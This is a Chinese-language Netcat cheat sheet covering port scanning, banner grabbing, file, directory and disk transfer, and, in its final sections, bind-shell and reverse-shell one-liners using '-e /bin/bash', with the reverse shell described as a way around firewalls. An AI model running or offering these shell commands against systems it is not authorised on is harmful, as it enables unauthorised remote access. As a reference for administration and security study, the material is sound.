Netcat 备忘清单
===

该备忘单提供了在 Linux 和 Unix 上使用 Netcat 的各种方法。

入门
------
<!--rehype:body-class=cols-5-->

### 用法
<!--rehype:wrap-class=col-span-2-->

连接到位于任何地方的主机

```shell
$ nc [options] [host] [port]
```

监听传入连接

```shell
$ nc -lp port [host] [port]
```

### 选项示例
<!--rehype:wrap-class=col-span-3 row-span-2-->

选项 | 示例 | 说明
:- | :- | :-
`-h`   | nc -h                      | 帮助
`-z`   | nc -z 192.168.1.9 1-100    | 端口扫描主机或 `IP` 地址
`-v`   | nc -zv 192.168.1.9 1-100   | 提供详细输出
`-n`   | nc -zn 192.168.1.9 1-100   | 通过禁用 `DNS` 解析进行快速扫描
`-l`   | nc -lp 8000                | `TCP` 侦听模式 _(用于入站连接)_
`-w`   | nc -w 180 192.168.1.9 8000 | 定义超时值
`-k`   | nc -kl 8000                | 断线后继续收听
`-u`   | nc -u 192.168.1.9 8000     | 使用 `UDP` 而不是 `TCP`
`-q`   | nc -q 1 192.168.1.9 8000   | 客户在 `EOF` 后熬夜
`-4`   | nc -4 -l 8000              | 仅限 `IPv4`
`-6`   | nc -6 -l 8000              | 仅限 `IPv6`

### 聊天客户端-服务器
<!--rehype:wrap-class=col-span-2-->

服务器 Server (192.168.1.9)

```shell
$ nc -lv 8000
```

客户端 Client

```shell
$ nc 192.168.1.9 8000
```

Netcat 示例
--------

### Banner 抓取

```shell
$ nc website.com 80
GET index.html HTTP/1.1
HEAD / HTTP/1.1
```

或者

```shell
echo "" | nc -zv -wl 192.168.1.1 801-805
```

### 端口扫描

扫描 `21` 到 `25` 之间的端口

```shell
$ nc -zvn 192.168.1.1 21-25
```

扫描端口 `22`、`3306` 和 `8080`

```shell
$ nc -zvn 192.168.1.1 22 3306 8080
```

### 代理和端口转发

```shell
$ nc -lp 8001 -c "nc 127.0.0.1 8000"
```

或者

```shell
$ nc -l 8001 | nc 127.0.0.1 8000
```

创建从一个本地端口到另一个本地端口的隧道

### 下载文件

服务器 Server (192.168.1.9)

```shell
$ nc -lv 8000 < file.txt
```

客户端 Client

```shell
$ nc -nv 192.168.1.9 8000 > file.txt
```

假设您想将文件 `file.txt` 从服务器 A 传输到客户端 B。

### 上传文件

服务器 Server (192.168.1.9)

```shell
$ nc -lv 8000 > file.txt
```

客户端 Client

```shell
$ nc 192.168.1.9 8000 < file.txt
```

假设您想将文件 `file.txt` 从客户端 `B` 传输到服务器 `A`

### 目录传输

服务器 Server (192.168.1.9)

```shell
$ tar -cvf – dir_name | nc -l 8000
```

客户端 Client

```shell
$ nc -n 192.168.1.9 8000 | tar -xvf -
```

假设您想通过网络将目录从 `A` 传输到 `B`

### 加密传输
<!--rehype:wrap-class=col-span-2-->

服务器 Server (192.168.1.9)

```shell
$ nc -l 8000 | openssl enc -d -des3 -pass pass:password > file.txt
```

客户端 Client

```shell
$ openssl enc -des3 -pass pass:password | nc 192.168.1.9 8000
```

在通过网络传输之前加密数据

### 克隆

服务器 Server (192.168.1.9)

```shell
$ dd if=/dev/sda | nc -l 8000
```

客户端 Client

```shell
$ nc -n 192.168.1.9 8000 | dd of=/dev/sda
```

克隆 linux PC 非常简单。假设你的系统盘是 /dev/sda

### 视频流

服务器 Server (192.168.1.9)

```shell
$ cat video.avi | nc -l 8000
```

客户端 Client

```shell
$ nc 192.168.1.9 8000 | mplayer -vo x11 -cache 3000 -
```

使用 netcat 流式传输视频

### 远程 shell

服务器 Server (192.168.1.9)

```shell
$ nc -lv 8000 -e /bin/bash
```

客户端 Client

```shell
$ nc 192.168.1.9 8000
```

我们已经使用 `telnet` 和 `ssh` 使用远程 `Shell`，但是如果它们没有安装并且我们没有安装它们的权限，那么我们也可以使用 `netcat` 创建远程 `shell`

### 逆转 shell

服务器 Server (192.168.1.9)

```shell
$ nc -lv 8000
```

客户端 Client

```shell
$ nc 192.168.1.9 8000 -v -e /bin/bash
```

反向 `shell` 通常用于绕过防火墙限制，例如阻止入站连接
